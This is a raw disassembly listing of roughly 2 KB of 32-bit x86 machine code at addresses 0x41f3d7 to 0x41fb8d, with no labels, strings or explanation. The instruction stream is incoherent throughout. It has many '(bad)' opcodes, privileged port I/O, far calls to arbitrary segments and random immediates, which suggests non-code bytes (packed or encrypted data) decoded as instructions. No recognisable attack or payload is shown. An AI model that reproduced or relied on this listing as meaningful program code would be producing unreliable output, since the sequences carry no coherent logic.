  41f3d7:	stos   DWORD PTR es:[edi],eax
  41f3d8:	pop    edi
  41f3d9:	push   eax
  41f3da:	mov    cl,0xf4
  41f3dc:	dec    edi
  41f3dd:	push   esi
  41f3de:	sub    BYTE PTR ds:[ebx-0x3dd30cdd],ah
  41f3e5:	imul   BYTE PTR [eax+0x16be39a9]
  41f3eb:	inc    esi
  41f3ec:	ja     0x41f45b
  41f3ee:	(bad)  
  41f3ef:	jbe    0x41f37e
  41f3f1:	push   ebx
  41f3f2:	jl     0x41f45b
  41f3f4:	cmc    
  41f3f5:	adc    DWORD PTR [eax+0x6af4857f],esi
  41f3fb:	add    DWORD PTR [ecx],esp
	...
  41f409:	add    BYTE PTR [eax],al
  41f40b:	arpl   WORD PTR ss:[eax-0x10],bp
  41f40f:	jge    0x41f40c
  41f411:	mov    esi,0x8c7853e7
  41f416:	daa    
  41f417:	jne    0x41f476
  41f419:	mov    bl,0xea
  41f41b:	lahf   
  41f41c:	xchg   ebp,eax
  41f41d:	add    DWORD PTR [eax],eax
  41f41f:	stos   BYTE PTR es:[edi],al
  41f420:	add    BYTE PTR [eax],al
  41f422:	add    BYTE PTR [edx],dl
  41f424:	mov    esi,edx
  41f426:	sbb    eax,0xae0c743e
  41f42b:	cwde   
  41f42c:	ror    DWORD PTR [esi-0x3208b51a],0x38
  41f433:	test   eax,0xd1d02e54
  41f438:	(bad)  
  41f439:	and    DWORD PTR [ecx+ebp*2+0x6b340bcd],esp
  41f440:	push   esi
  41f441:	dec    edi
  41f442:	mov    eax,0x24ff648b
  41f447:	(bad)  
  41f448:	push   ebp
  41f449:	adc    al,0x8c
  41f44b:	sub    BYTE PTR [ebp-0x3126eb6],bh
  41f451:	add    eax,0x456cd6c
  41f456:	mov    ebp,0x11065c0d
  41f45b:	add    BYTE PTR [edi-0x25de9dd3],dh
  41f461:	ins    BYTE PTR es:[edi],dx
  41f462:	xor    ebx,ecx
  41f464:	popa   
  41f465:	stos   BYTE PTR es:[edi],al
  41f466:	dec    esp
  41f467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f468:	sbb    al,0x44
  41f46a:	or     eax,0xd2fe4baa
  41f46f:	lods   al,BYTE PTR ds:[esi]
  41f470:	dec    ebp
  41f471:	cmp    eax,0xc4936e68
  41f476:	mov    esi,0xcdd6429e
  41f47b:	pop    ebp
  41f47c:	pop    edx
  41f47d:	sbb    eax,0xb6981624
  41f482:	jbe    0x41f495
  41f484:	aad    0x2a
  41f486:	inc    edx
  41f487:	test   cl,bh
  41f489:	cld    
  41f48a:	mov    esp,0xa57ffa03
  41f48f:	icebp  
  41f490:	sbb    BYTE PTR ds:0x76d298cc,ah
  41f496:	dec    edi
  41f497:	jle    0x41f440
  41f499:	popf   
  41f49a:	pop    eax
  41f49b:	dec    cl
  41f49d:	cmp    bh,ch
  41f49f:	fidiv  WORD PTR [esi]
  41f4a1:	mov    ebx,0xa57afb8c
  41f4a6:	mov    BYTE PTR [esi+0xe8c350d],al
  41f4ac:	sahf   
  41f4ad:	sbb    BYTE PTR fs:[edx+ebx*8-0x11],dl
  41f4b2:	jns    0x41f4f1
  41f4b4:	mov    ah,0xa8
  41f4b6:	xchg   esi,eax
  41f4b7:	popf   
  41f4b8:	test   edx,ebx
  41f4ba:	icebp  
  41f4bb:	call   0xc3be:0x28758246
  41f4c2:	cli    
  41f4c3:	dec    edi
  41f4c4:	fs enter 0xff86,0x3c
  41f4c9:	outs   dx,BYTE PTR ds:[esi]
  41f4ca:	adc    BYTE PTR [ecx+0x18],dl
	...
  41f4d9:	add    BYTE PTR [eax],al
  41f4db:	daa    
  41f4dc:	push   ecx
  41f4dd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41f4e7:	icebp  
  41f4e8:	sub    cl,BYTE PTR [edi+0x1a23d89]
  41f4ee:	add    BYTE PTR [edx+0x53000000],ch
  41f4f4:	sbb    BYTE PTR [ecx],cl
  41f4f6:	shr    BYTE PTR [eax+0x13fe3d94],cl
  41f4fc:	add    DWORD PTR [edx+0x39],edi
  41f4ff:	in     eax,dx
  41f500:	test   al,0xe3
  41f502:	push   es
  41f503:	out    0x4f,eax
  41f505:	sub    BYTE PTR [ecx],al
  41f507:	lahf   
  41f508:	pop    edx
  41f509:	xchg   BYTE PTR ds:0x9ee99479,al
  41f50f:	mov    DWORD PTR [ecx-0x22],ecx
  41f512:	aaa    
  41f513:	mov    eax,0x1627166e
  41f518:	jae    0x41f578
  41f51a:	repz inc ecx
  41f51c:	mov    ecx,0x1bd0cf70
  41f521:	sub    eax,0xe6a2d2a2
  41f526:	jmp    0x41f573
  41f528:	fidivr WORD PTR [edi+ebx*1-0x6]
  41f52c:	add    edx,DWORD PTR [ecx-0x2e30b375]
  41f532:	orps   xmm5,XMMWORD PTR [edx+0x52c84903]
  41f539:	loope  0x41f4ee
  41f53b:	lods   al,BYTE PTR ds:[esi]
  41f53c:	pop    esp
  41f53d:	jge    0x41f5bd
  41f53f:	cli    
  41f540:	div    DWORD PTR [ebx-0x63]
  41f543:	jno    0x41f544
  41f545:	mov    eax,DWORD PTR [edi]
  41f547:	xchg   esp,eax
  41f548:	adc    dl,BYTE PTR [ebx+0x422a4fe9]
  41f54e:	shl    BYTE PTR [edx+ecx*1-0x29],0x38
  41f553:	lds    esp,FWORD PTR [esi+0x7b634d03]
  41f559:	ds out dx,eax
  41f55b:	xor    esi,DWORD PTR [eax-0x210ea6a0]
  41f561:	add    esp,DWORD PTR [edi+eiz*4-0x2a]
  41f565:	pop    esi
  41f566:	push   0xffffffe0
  41f568:	enter  0x55dd,0x39
  41f56c:	pop    ds
  41f56d:	inc    ecx
  41f56e:	aaa    
  41f56f:	push   cx
  41f571:	push   0x2e
  41f573:	and    eax,0xf4aa646
  41f578:	sbb    eax,edi
  41f57a:	data16 adc bl,BYTE PTR [edi+0x32]
  41f57e:	inc    ecx
  41f57f:	inc    edi
  41f580:	jno    0x41f5ea
  41f582:	inc    DWORD PTR [esi-0x80]
  41f585:	mov    dh,0xa7
  41f587:	inc    edx
  41f588:	mov    ds:0x9206dea1,al
  41f58d:	mov    BYTE PTR [ecx+edx*1-0x52],al
  41f591:	sbb    eax,DWORD PTR [ebx+0xae8302]
  41f597:	scas   eax,DWORD PTR es:[edi]
  41f598:	push   esp
  41f599:	add    edi,DWORD PTR [ecx-0x42]
  41f59c:	(bad)  
	...
  41f5a9:	add    BYTE PTR [eax],al
  41f5ab:	daa    
  41f5ac:	ss lahf 
  41f5ae:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f5b4:	and    eax,0xffbf075b
  41f5b9:	sahf   
  41f5ba:	pop    ecx
  41f5bb:	out    0xa2,eax
  41f5bd:	add    DWORD PTR [eax],eax
  41f5bf:	stos   BYTE PTR es:[edi],al
  41f5c0:	add    BYTE PTR [eax],al
  41f5c2:	add    BYTE PTR [ecx+0x6740d1e7],bl
  41f5c8:	js     0x41f5bf
  41f5ca:	ror    ah,cl
  41f5cc:	jg     0x41f56e
  41f5ce:	scas   al,BYTE PTR es:[edi]
  41f5cf:	popf   
  41f5d0:	cmp    BYTE PTR ds:0x6a0fb789,dl
  41f5d6:	loope  0x41f648
  41f5d8:	pop    ds
  41f5d9:	mov    al,0x38
  41f5db:	(bad)  
  41f5dc:	and    bh,bl
  41f5de:	push   edi
  41f5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5e0:	aam    0x87
  41f5e2:	xchg   BYTE PTR [eax+0x4e],ch
  41f5e5:	stos   BYTE PTR es:[edi],al
  41f5e6:	scas   al,BYTE PTR es:[edi]
  41f5e7:	xchg   ecx,eax
  41f5e8:	jb     0x41f594
  41f5ea:	or     BYTE PTR [ebx+edx*2+0x5b89c11f],bh
  41f5f1:	(bad)  
  41f5f2:	fcomp  DWORD PTR [eax+0x60]
  41f5f5:	repnz test BYTE PTR [edi+0x5c0e4cfd],bl
  41f5fc:	cdq    
  41f5fd:	jecxz  0x41f65e
  41f5ff:	aad    0x66
  41f601:	(bad)  
  41f602:	aaa    
  41f603:	test   ax,0x323f
  41f607:	shr    cl,cl
  41f609:	inc    edi
  41f60a:	shr    BYTE PTR [ecx],0xd6
  41f60d:	fcomp  QWORD PTR [eax-0x1a4982f5]
  41f613:	ins    DWORD PTR es:[edi],dx
  41f614:	arpl   WORD PTR [eax],si
  41f616:	stos   BYTE PTR es:[edi],al
  41f617:	jmp    0x35da31ec
  41f61c:	jo     0x41f653
  41f61e:	aam    0xad
  41f620:	stos   BYTE PTR es:[edi],al
  41f621:	cmovns eax,DWORD PTR [edi]
  41f624:	fmul   st(5),st
  41f627:	inc    esp
  41f628:	xchg   ebp,eax
  41f629:	add    DWORD PTR [eax-0x42f9908d],ebp
  41f62f:	or     dl,bh
  41f631:	sbb    eax,0x7c4564d4
  41f636:	mov    ah,0x33
  41f638:	jmp    0x41f6a5
  41f63a:	in     al,dx
  41f63b:	mov    edx,0x97c6622d
  41f640:	outs   dx,BYTE PTR ds:[esi]
  41f641:	inc    ebx
  41f642:	add    eax,0xb670e44f
  41f647:	rol    ecx,cl
  41f649:	hlt    
  41f64a:	push   0x59a9c9a9
  41f64f:	pop    eax
  41f650:	outs   dx,DWORD PTR ds:[esi]
  41f651:	push   ebx
  41f652:	cmp    DWORD PTR [ecx+0x49e69d59],ecx
  41f658:	scas   al,BYTE PTR es:[edi]
  41f659:	pop    edx
  41f65a:	adc    cl,BYTE PTR [ecx]
  41f65c:	lahf   
  41f65d:	ja     0x41f5f8
  41f65f:	sbb    dl,0x4d
  41f662:	cmp    ecx,ecx
  41f664:	cmc    
  41f665:	mov    al,0xf6
  41f667:	jne    0x41f652
  41f669:	adc    al,0x74
  41f66b:	scas   al,BYTE PTR es:[edi]
  41f66c:	cdq    
	...
  41f679:	add    BYTE PTR [eax],al
  41f67b:	aaa    
  41f67c:	(bad)  
  41f67d:	out    0xc2,eax
  41f67f:	mul    ebx
  41f681:	aaa    
  41f682:	cmc    
  41f683:	xchg   ecx,eax
  41f684:	call   0x3b19:0xeeeeeef4
  41f68b:	xchg   ecx,eax
  41f68c:	mov    ds:0xaa0001,eax
  41f691:	add    BYTE PTR [eax],al
  41f693:	pop    edx
  41f694:	dec    ebp
  41f695:	popa   
  41f696:	test   BYTE PTR [eax-0x51720c7d],ch
  41f69c:	inc    edi
  41f69d:	ins    DWORD PTR es:[edi],dx
  41f69e:	cmp    dl,bl
  41f6a0:	pop    ss
  41f6a1:	jmp    0xe7c1:0xcd744d6c
  41f6a8:	jae    0x41f6e7
  41f6aa:	push   eax
  41f6ab:	(bad)  
  41f6ac:	mov    eax,gs:0x234eb70e
  41f6b2:	xchg   ecx,eax
  41f6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6b4:	mov    bh,0x5a
  41f6b6:	and    ebp,ebp
  41f6b8:	xchg   edi,eax
  41f6b9:	cli    
  41f6ba:	dec    ecx
  41f6bb:	mov    bh,0xb5
  41f6bd:	aad    0x60
  41f6bf:	test   eax,0x16aa72a6
  41f6c4:	lock or cl,BYTE PTR [edx]
  41f6c7:	pop    es
  41f6c8:	test   BYTE PTR [esi],dl
  41f6ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6cb:	sbb    al,BYTE PTR [ebp+0x5f]
  41f6ce:	cmp    ebp,DWORD PTR [edx-0x22]
  41f6d1:	(bad)  
  41f6d2:	lds    edx,FWORD PTR [eax+0x2f]
  41f6d5:	add    ah,BYTE PTR [edx]
  41f6d7:	or     DWORD PTR [ebp+0x21c97e4d],edx
  41f6dd:	popa   
  41f6de:	or     bh,BYTE PTR [ecx-0x6dacbf97]
  41f6e4:	inc    ecx
  41f6e5:	iret   
  41f6e6:	test   al,0x33
  41f6e8:	mov    WORD PTR [ecx-0x33dc2cb2],ds
  41f6ee:	mov    cl,0xe9
  41f6f0:	in     eax,dx
  41f6f1:	sbb    esp,DWORD PTR [edi-0x8]
  41f6f4:	inc    esp
  41f6f5:	cmp    BYTE PTR [edx+eiz*4],bl
  41f6f8:	push   eax
  41f6f9:	sub    ebp,DWORD PTR [eax+0x5e]
  41f6fc:	push   ds
  41f6fd:	mov    ecx,gs
  41f6ff:	enter  0x111c,0xe4
  41f703:	mov    esp,0x8ea5f536
  41f708:	xor    eax,ebp
  41f70a:	pop    ebp
  41f70b:	adc    al,0x7b
  41f70d:	out    dx,al
  41f70e:	add    ecx,esp
  41f710:	xor    eax,0x832e45aa
  41f715:	loop   0x41f70f
  41f717:	mov    ds:0x8d9994be,al
  41f71c:	mov    DWORD PTR [eax+ebx*4],eax
  41f71f:	cmp    BYTE PTR [ebx-0x17],cl
  41f722:	push   esi
  41f723:	jne    0x41f756
  41f725:	push   ecx
  41f726:	push   ebp
  41f727:	ins    DWORD PTR es:[edi],dx
  41f728:	or     BYTE PTR [eax],ch
  41f72a:	xor    ebx,DWORD PTR [ebx]
  41f72c:	cld    
  41f72d:	xchg   edi,eax
  41f72e:	mov    ds:0xc6a244d8,eax
  41f733:	repnz mov BYTE PTR [ebx+esi*1-0x72],dl
  41f738:	push   edi
  41f739:	iret   
  41f73a:	jl     0x41f760
  41f73c:	push   edi
	...
  41f749:	add    BYTE PTR [eax],al
  41f74b:	push   ss
  41f74c:	aad    0xdf
  41f74e:	out    dx,eax
  41f74f:	fucomip st,st(7)
  41f751:	ss std 
  41f753:	cmp    BYTE PTR [esi+0x28c75f3a],al
  41f759:	ja     0x41f6ed
  41f75b:	cmp    esp,DWORD PTR [ecx+eax*1+0xaa00]
  41f762:	add    BYTE PTR [ecx],dh
  41f764:	sti    
  41f765:	mov    al,ds:0x7138cd8e
  41f76a:	(bad)  es:[edi]
  41f76d:	lock ret 0x6270
  41f771:	xchg   dh,al
  41f773:	cmp    edi,edx
  41f775:	arpl   WORD PTR [edx],dx
  41f777:	aad    0xaf
  41f779:	shr    DWORD PTR [esi-0x71b79b40],0xb
  41f780:	inc    esp
  41f782:	loopne 0x41f725
  41f784:	retf   
  41f785:	push   edx
  41f786:	adc    ch,dl
  41f788:	xchg   esi,eax
  41f789:	xchg   ebx,eax
  41f78a:	les    ecx,FWORD PTR [edx]
  41f78c:	inc    esp
  41f78d:	int    0xc
  41f78f:	or     BYTE PTR [eax-0x7cbacb1e],ch
  41f795:	or     BYTE PTR [esi-0x65fdcaf],ch
  41f79b:	enter  0x9e49,0x5b
  41f79f:	aad    0x99
  41f7a1:	daa    
  41f7a2:	jmp    0x41f817
  41f7a4:	nop
  41f7a5:	hlt    
  41f7a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7a7:	(bad)  
  41f7a8:	shl    DWORD PTR [esi+0x47],1
  41f7ab:	jge    0x41f7da
  41f7ad:	adc    dh,bl
  41f7af:	loopne 0x41f777
  41f7b1:	xchg   esi,eax
  41f7b2:	dec    esi
  41f7b3:	cld    
  41f7b4:	jl     0x41f765
  41f7b6:	jle    0x41f741
  41f7b8:	call   0xc7f0:0x4bc0b301
  41f7bf:	fcomip st,st(3)
  41f7c1:	mov    al,ds:0xc4c3115c
  41f7c6:	aas    
  41f7c7:	push   cs
  41f7c8:	fcomp  DWORD PTR [esi]
  41f7ca:	mov    al,ds:0xa34d7eeb
  41f7cf:	mov    dh,dh
  41f7d1:	push   0x55
  41f7d3:	dec    ebx
  41f7d4:	mov    al,0x0
  41f7d6:	repnz pusha 
  41f7d8:	fisub  DWORD PTR [edx]
  41f7da:	imul   ebp,DWORD PTR [ebp-0x80],0xffffffb4
  41f7de:	sbb    DWORD PTR [ebx-0x2a9ef649],ecx
  41f7e4:	cmp    BYTE PTR [edx],bh
  41f7e6:	or     esi,DWORD PTR [eax+0x407221f4]
  41f7ec:	push   esi
  41f7ed:	ss sti 
  41f7ef:	adc    eax,0xaab242ba
  41f7f4:	std    
  41f7f5:	mov    ds:0x91c12f33,al
  41f7fa:	and    al,0xce
  41f7fc:	mov    ds:0x21922152,al
  41f801:	sbb    al,0xf2
  41f803:	inc    ebp
  41f804:	xchg   BYTE PTR [esp+eiz*2+0x7d],dl
  41f808:	jne    0x41f818
  41f80a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f80b:	xchg   BYTE PTR [ebx+0x0],ch
	...
  41f81a:	add    BYTE PTR [esi+0x76],ch
  41f81d:	in     al,0xca
  41f81f:	cld    
  41f820:	fisubr DWORD PTR [esi-0xa]
  41f823:	sbb    BYTE PTR [edx+0x2b949787],dl
  41f829:	outs   dx,BYTE PTR ds:[esi]
  41f82a:	shl    ebp,cl
  41f82c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f82d:	add    DWORD PTR [eax],eax
  41f82f:	stos   BYTE PTR es:[edi],al
  41f830:	add    BYTE PTR [eax],al
  41f832:	add    dl,bh
  41f834:	(bad)  
  41f835:	mov    ds:0xc93db4b8,eax
  41f83a:	jg     0x41f7d2
  41f83c:	loop   0x41f832
  41f83e:	cwde   
  41f83f:	jb     0x41f7cc
  41f841:	scas   eax,DWORD PTR es:[edi]
  41f842:	cmp    edi,DWORD PTR [eax]
  41f844:	dec    edx
  41f845:	cwde   
  41f846:	icebp  
  41f847:	scas   al,BYTE PTR es:[edi]
  41f848:	mov    bl,0x78
  41f84a:	adc    esi,DWORD PTR [esi-0x7e6f23d6]
  41f850:	mov    dl,bh
  41f852:	repz jae 0x41f82e
  41f855:	jg     0x41f89f
  41f857:	cmp    edx,DWORD PTR [edx-0x5a]
  41f85a:	lea    ebx,[edx+0x135e50d0]
  41f860:	dec    ecx
  41f861:	outs   dx,BYTE PTR ds:[esi]
  41f862:	cwde   
  41f863:	js     0x41f8bd
  41f865:	and    ch,BYTE PTR [ebp+0x11]
  41f868:	int3   
  41f869:	xchg   BYTE PTR [ecx+eax*4],ch
  41f86c:	pop    edi
  41f86d:	scas   eax,DWORD PTR es:[edi]
  41f86e:	or     ecx,DWORD PTR [edi+0xeb59968]
  41f874:	xor    ah,bl
  41f876:	mov    eax,ds:0xcc831010
  41f87b:	mov    fs,WORD PTR [edx-0x52]
  41f87e:	sub    DWORD PTR ds:0x2cb0e27b,0x5a
  41f885:	aas    
  41f886:	mov    dh,0xb9
  41f888:	sub    eax,0x8349afbe
  41f88d:	push   0x77
  41f88f:	neg    BYTE PTR [eax]
  41f891:	mov    esp,0x4bdc1597
  41f896:	jmp    0x7f7c:0x27826ed6
  41f89d:	ret    0xea37
  41f8a0:	mov    edi,0xde54f6
  41f8a5:	ss add eax,0x9c47ed66
  41f8ab:	arpl   sp,bx
  41f8ad:	add    cl,BYTE PTR [edi-0x80]
  41f8b0:	push   eax
  41f8b1:	pop    edi
  41f8b2:	int    0x9
  41f8b4:	dec    edi
  41f8b5:	cmp    al,0x7f
  41f8b7:	or     BYTE PTR [edx+0x7e],0xa
  41f8bb:	sbb    esi,esi
  41f8bd:	daa    
  41f8be:	popf   
  41f8bf:	arpl   sp,si
  41f8c1:	cdq    
  41f8c2:	nop
  41f8c3:	lahf   
  41f8c4:	sub    DWORD PTR [eax],ecx
  41f8c6:	stos   DWORD PTR es:[edi],eax
  41f8c7:	mov    eax,ds:0x2dbdeef5
  41f8cc:	xchg   esi,eax
  41f8cd:	stos   DWORD PTR es:[edi],eax
  41f8ce:	in     al,dx
  41f8cf:	das    
  41f8d0:	inc    edi
  41f8d1:	aad    0x31
  41f8d3:	dec    ebx
  41f8d4:	xor    eax,0x3a155356
  41f8d9:	lea    ebp,[edi]
  41f8db:	repnz adc eax,DWORD PTR [eax]
	...
  41f8ea:	add    BYTE PTR [edx],bh
  41f8ec:	push   edx
  41f8ed:	les    ecx,FWORD PTR [edi]
  41f8ef:	in     al,dx
  41f8f0:	lahf   
  41f8f1:	sti    
  41f8f2:	ja     0x41f8ea
  41f8f4:	rcl    DWORD PTR [eax-0x2e97242d],1
  41f8fa:	aas    
  41f8fb:	(bad)  
  41f8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8fd:	add    DWORD PTR [eax],eax
  41f8ff:	stos   BYTE PTR es:[edi],al
  41f900:	add    BYTE PTR [eax],al
  41f902:	add    BYTE PTR [eax],cl
  41f904:	int    0x3f
  41f906:	(bad)  
  41f907:	outs   dx,DWORD PTR ds:[esi]
  41f908:	jb     0x41f8e0
  41f90a:	imul   edi,ebx,0xd4a6f03d
  41f910:	push   esp
  41f911:	xchg   ecx,eax
  41f912:	int3   
  41f913:	inc    esi
  41f914:	js     0x41f98e
  41f916:	cwde   
  41f917:	test   BYTE PTR ds:0xb6d4ad58,al
  41f91d:	call   0x215b7166
  41f922:	sbb    DWORD PTR [edx],edi
  41f924:	jno    0x41f948
  41f926:	push   ds
  41f927:	mov    ss,ebp
  41f929:	jle    0x41f8e7
  41f92b:	push   ss
  41f92c:	dec    ecx
  41f92d:	jnp    0x41f999
  41f92f:	fpatan 
  41f931:	call   0x57a49e94
  41f936:	dec    ebp
  41f937:	std    
  41f938:	jnp    0x41f989
  41f93a:	push   0x40
  41f93c:	jnp    0x41f957
  41f93e:	in     al,dx
  41f93f:	mov    eax,0x6efcce95
  41f944:	mov    edx,0x595600e4
  41f949:	jp     0x41f90e
  41f94b:	scas   al,BYTE PTR es:[edi]
  41f94c:	xchg   BYTE PTR [edi],dl
  41f94e:	adc    al,0x44
  41f950:	xor    ebp,eax
  41f952:	das    
  41f953:	push   ebx
  41f954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f955:	sub    eax,0x63aefba4
  41f95a:	adc    eax,0xa4f2ca82
  41f95f:	icebp  
  41f960:	fs inc eax
  41f962:	fcom   DWORD PTR [eax-0x65]
  41f965:	and    eax,0x5479a6a9
  41f96a:	xchg   ecx,eax
  41f96b:	mov    esi,DWORD PTR ds:0x6d8b14ed
  41f971:	inc    ecx
  41f972:	mov    eax,0xeb12de10
  41f977:	addr16 popa 
  41f979:	push   ebx
  41f97a:	jbe    0x41f97a
  41f97c:	inc    ecx
  41f97d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f97f:	popf   
  41f980:	stos   DWORD PTR es:[edi],eax
  41f981:	neg    cl
  41f983:	push   ss
  41f984:	ror    edx,cl
  41f986:	pmaxsw mm1,QWORD PTR [ecx+0x59a194ad]
  41f98d:	gs popf 
  41f98f:	fcom   st(3)
  41f991:	pop    esi
  41f992:	sub    DWORD PTR [esi+edi*2],ecx
  41f995:	pop    ecx
  41f996:	cmp    bh,BYTE PTR [eax-0x3f]
  41f999:	jge    0x41f9b2
  41f99b:	jno    0x41f9fc
  41f99d:	das    
  41f99e:	jno    0x41f952
  41f9a0:	lods   al,BYTE PTR ds:[esi]
  41f9a1:	test   al,0xea
  41f9a3:	lahf   
  41f9a4:	pop    esp
  41f9a5:	sbb    al,0x58
  41f9a7:	retf   
  41f9a8:	test   al,0xa8
  41f9aa:	mov    al,ds:0x93fc
	...
  41f9bb:	xchg   ebx,eax
  41f9bc:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f9c3:	push   eax
  41f9c4:	loopne 0x41f9c0
  41f9c6:	call   0xa639:0xa5acb67e
  41f9cd:	add    DWORD PTR [eax],eax
  41f9cf:	stos   BYTE PTR es:[edi],al
  41f9d0:	add    BYTE PTR [eax],al
  41f9d2:	add    BYTE PTR [esi+0x3c85603a],al
  41f9d8:	int3   
  41f9d9:	pop    esi
  41f9da:	dec    ebp
  41f9db:	jb     0x41f9c7
  41f9dd:	mov    eax,ebx
  41f9df:	and    DWORD PTR [ebx+0x5292b3bc],ecx
  41f9e5:	scas   al,BYTE PTR es:[edi]
  41f9e6:	out    0xee,eax
  41f9e8:	sbb    al,0x3f
  41f9ea:	es jmp 0x1adc1d52
  41f9f0:	adc    DWORD PTR [edx-0x30dbdd66],ebx
  41f9f6:	ficom  DWORD PTR [esi+0x73]
  41f9f9:	les    ecx,FWORD PTR [esi]
  41f9fb:	push   eax
  41f9fc:	fbstp  TBYTE PTR [esi-0x3fb6a353]
  41fa02:	adc    BYTE PTR [ebp+0x7b],al
  41fa05:	imul   esi,DWORD PTR [edi+edi*2],0xffffff9c
  41fa09:	sub    eax,0x53f46f4b
  41fa0e:	ss popa 
  41fa10:	dec    eax
  41fa11:	icebp  
  41fa12:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41fa14:	cmp    ecx,ebx
  41fa16:	ins    DWORD PTR es:[edi],dx
  41fa17:	clc    
  41fa18:	sub    BYTE PTR [ecx-0x4b65d03f],dl
  41fa1e:	mov    cl,0xa4
  41fa20:	push   ss
  41fa21:	scas   al,BYTE PTR es:[edi]
  41fa22:	push   ebx
  41fa23:	sti    
  41fa24:	jns    0x41f9d8
  41fa26:	xacquire xchg DWORD PTR [ecx-0x3f6c6bba],edi
  41fa2d:	test   edi,0x14f705c2
  41fa33:	dec    esi
  41fa34:	stc    
  41fa35:	loope  0x41fa99
  41fa37:	icebp  
  41fa38:	sbb    DWORD PTR [ebp+ebp*4+0x74d1e739],0x4d335199
  41fa43:	cmp    DWORD PTR [eax],0x69
  41fa46:	sub    DWORD PTR [ecx+eax*4-0x10],esi
  41fa4a:	pushf  
  41fa4b:	inc    edx
  41fa4c:	jno    0x41fa6f
  41fa4e:	inc    ecx
  41fa4f:	jb     0x41fa72
  41fa51:	add    al,0x66
  41fa53:	out    dx,al
  41fa54:	mov    dl,0x72
  41fa56:	mov    eax,DWORD PTR [esi-0x62]
  41fa59:	inc    edx
  41fa5a:	sbb    DWORD PTR [edi],esp
  41fa5c:	aas    
  41fa5d:	repnz xor al,cl
  41fa60:	std    
  41fa61:	push   0x1eeb19bd
  41fa66:	xor    DWORD PTR [esi],edx
  41fa68:	jmp    0x41fae9
  41fa6a:	lock mov ebp,DWORD PTR [edx-0x2117674]
  41fa71:	add    ebx,DWORD PTR [eax]
  41fa73:	lea    ebp,[edx-0x3b]
  41fa76:	mov    cs,WORD PTR [edi-0x72]
  41fa79:	mov    eax,0xfa312a
	...
  41fa8a:	add    ah,bl
  41fa8c:	fincstp 
  41fa8e:	shl    bh,0xee
  41fa91:	(bad)  
  41fa92:	frstor [ecx+eax*1]
  41fa95:	pop    ebp
  41fa96:	dec    edi
  41fa97:	lahf   
  41fa98:	call   0xa72540db
  41fa9d:	add    DWORD PTR [eax],eax
  41fa9f:	stos   BYTE PTR es:[edi],al
  41faa0:	add    BYTE PTR [eax],al
  41faa2:	add    bh,cl
  41faa4:	clc    
  41faa5:	cmp    DWORD PTR [edx+0x71],0x16
  41faa9:	ins    BYTE PTR es:[edi],dx
  41faaa:	jl     0x41fa6e
  41faac:	rol    bl,cl
  41faae:	inc    edi
  41faaf:	adc    BYTE PTR [edi-0x4d3eb170],0x4b
  41fab6:	add    al,0x65
  41fab9:	push   es
  41faba:	inc    esi
  41fabb:	or     DWORD PTR [edx+edx*4+0x6f6849ee],ecx
  41fac2:	arpl   WORD PTR [ebx-0x1f2f0d2b],cx
  41fac8:	rcl    DWORD PTR [edi-0x70],1
  41facb:	push   esi
  41facc:	js     0x41fafd
  41face:	jmp    0x8acd:0xf6e36a53
  41fad5:	xrelease xchg DWORD PTR [ecx-0x73],ecx
  41fad9:	jecxz  0x41fa6e
  41fadb:	sbb    eax,0x6d894c98
  41fae0:	in     al,dx
  41fae1:	inc    edi
  41fae2:	lds    ebx,FWORD PTR [esi+ecx*8+0x1b]
  41fae6:	je     0x41fb50
  41fae8:	fcomp  DWORD PTR [esi-0x4b9f0655]
  41faee:	(bad)  
  41faef:	into   
  41faf0:	das    
  41faf1:	xchg   edi,eax
  41faf2:	outs   dx,BYTE PTR ds:[esi]
  41faf3:	imul   edi,DWORD PTR [eax-0x3f],0xee0fbbdd
  41fafa:	sbb    DWORD PTR [ebx+edx*4+0x14],esp
  41fafe:	push   eax
  41faff:	fninit 
  41fb01:	aam    0x6a
  41fb03:	shl    edi,0x1e
  41fb06:	mov    es,WORD PTR es:[eax]
  41fb09:	cmp    ecx,DWORD PTR [esp+edi*8+0x41b758fb]
  41fb10:	xchg   esi,eax
  41fb11:	shr    ebx,cl
  41fb13:	fld    QWORD PTR [ebx-0x112719b5]
  41fb19:	test   al,0xf5
  41fb1b:	sbb    eax,0x2ff89f66
  41fb20:	xor    ch,ah
  41fb22:	pop    ebp
  41fb23:	dec    esi
  41fb24:	xor    ecx,DWORD PTR [eax]
  41fb26:	ret    
  41fb27:	mov    ecx,0x24e374f7
  41fb2c:	ja     0x41faca
  41fb2e:	es jecxz 0x41faf5
  41fb31:	sub    eax,0x424623fa
  41fb36:	out    dx,al
  41fb37:	aad    0xac
  41fb39:	outs   dx,BYTE PTR ds:[esi]
  41fb3a:	rcr    BYTE PTR [ecx],cl
  41fb3c:	add    eax,0x3659ee1f
  41fb41:	das    
  41fb42:	push   ecx
  41fb43:	dec    esi
  41fb44:	mov    eax,0x6d383893
  41fb49:	xchg   ecx,eax
  41fb4a:	sahf   
  41fb4b:	add    eax,DWORD PTR ds:0x0
	...
  41fb59:	add    BYTE PTR [eax],al
  41fb5b:	outs   dx,DWORD PTR ds:[esi]
  41fb5c:	mov    ds:0x7edd2ad4,al
  41fb61:	jmp    edi
  41fb63:	push   edx
  41fb64:	fcmovu st,st(5)
  41fb66:	in     eax,0xd6
  41fb68:	inc    esp
  41fb69:	out    0x39,eax
  41fb6b:	lea    esp,[edi+0xaa0001]
  41fb71:	add    BYTE PTR [eax],al
  41fb73:	or     BYTE PTR [ebx+0x169f48f2],dh
  41fb79:	sbb    bl,al
  41fb7b:	enter  0xe78f,0x7d
  41fb7f:	fiadd  WORD PTR [ecx+0x1b702aaa]
  41fb85:	mov    WORD PTR [ebp+0x74],?
  41fb88:	mov    al,0xfe
  41fb8a:	add    BYTE PTR [edx],0x70
  41fb8d:	int3   
